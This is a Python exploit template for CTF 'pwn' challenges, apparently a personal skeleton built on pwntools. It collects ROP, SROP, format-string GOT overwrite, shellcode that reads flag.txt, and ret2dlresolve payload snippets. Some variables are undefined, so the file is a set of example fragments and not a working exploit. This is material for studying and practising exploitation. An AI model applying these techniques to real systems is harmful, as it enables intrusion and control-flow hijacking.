#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './pwn'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote', 'ssh')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET', ssh = 'SSH')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'target', 'port':4296}, \
                        ssh     = {'host':'target', 'port':22, 'user':'user', 'password':'pass', 'run':bin_file})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.31.so', \
                        ssh     = 'libc-2.31.so')
env.select('local')

#==========

binf = ELF(bin_file)
addr_plt_puts       = binf.plt['puts']
addr_got_main       = binf.got['__libc_start_main']
addr_bss            = binf.sep_section['.bss']
addr_main           = binf.sep_function['main']

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_main        = libc.sep_function['__libc_start_main']
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn, **kwargs):
    pwn = Pwn(conn)

    # log
    success('success    = 0x{:08x}'.format(0xdeadbeef))
    info('information   = 0x{:08x}'.format(0xdeadbeef))
    warn('waring        = 0x{:08x}'.format(0xcafebabe))
    debug('debug        = 0x{:08x}'.format(0xcafebabe))

    with log.progress('Progress ') as p:
        for i in range(0, 100, 5):
            p.status("{} %".format(i))

    # ROP
    rop = ROP(binf)
    rop.printf(addr_got_printf)
    rop.main()
    rop.raw(rop.ebp)
    rop.raw(0xcafebebe)
    rop.raw(rop.ret_4)
    rop.raw(0xdeadbeef)
    rop.raw(addr_main)
    conn.sendline(bytes(rop))

    # SROP
    frame = SigreturnFrame()
    frame.rax = constants.SYS_mprotect
    frame.rdi = addr_bin_base
    frame.rsi = 0x1000
    frame.rdx = 0x7
    frame.rsp = addr_bin_base + 0x170 - 0x128
    frame.rip = addr_bin_base + 0x101
    conn.sendline(bytes(frame))

    # libc
    addr_libc_printf    = u32(conn.recv(4))
    libc.address        = addr_libc_printf - offset_libc_printf
    info('addr_libc_base = 0x%08x' % libc.address)
    addr_libc_str_sh    = next(libc.search(b'/bin/sh'))

    # FSB
    overwrite[addr_got_puts] = addr_libc_system
    payload  = b'hoge'
    payload += fmtstr_payload(5, overwrite, numbwritten = len(payload), write_size = 'short')

    # shellcode
    args = {'addr':0xdeadbeef, 'size':0x100}
    shellasm = '''
    mov eax, SYS_write
    mov ebx, STDOUT_FILENO
    mov ecx, {addr}
    mov edx, {size}
    int 0x80
    '''.format(**args)

    shellasm += shellcraft.dup2(4,0)
    shellasm += shellcraft.dup2(4,1)
    shellasm += shellcraft.open('flag.txt')
    shellasm += shellcraft.read('eax', addr_bss, 0x500)
    shellasm += shellcraft.write('STDOUT_FILENO', addr_bss, 'eax')

    shellcode = asm(shellasm)

    # dl runtime resolve
    dll = DlRuntime.Lookup(binf, avoid_version = True)
    dll.add_reloc('system', addr_got_atoi)
    dll.add_reloc('printf', addr_got_puts)
    dll.resolve(addr_buf)
    payload  = dll.reloc_payload

    exploit  = p64(addr_plt_reloc)
    exploit += p64(dll.reloc_offset('system'))

    dl = DlRuntime(binf, libc)
    dld = dl.delta(base = 'printf')
    dld.set_victim('gets')
    dld.resolve(addr_buf, 'system')
    fake_link_map = dld.delta_payload

class Pwn:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def func(self):
        self.sendlineafter('> ', '1')

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    # comn.bruteforce(attack)
    # comn.repeat(attack, True, cands)
    # comn.repeat_depth(attack, 1, range(0x20), cands)
    comn.interactive()

if __name__=='__main__':
    main()

#==========
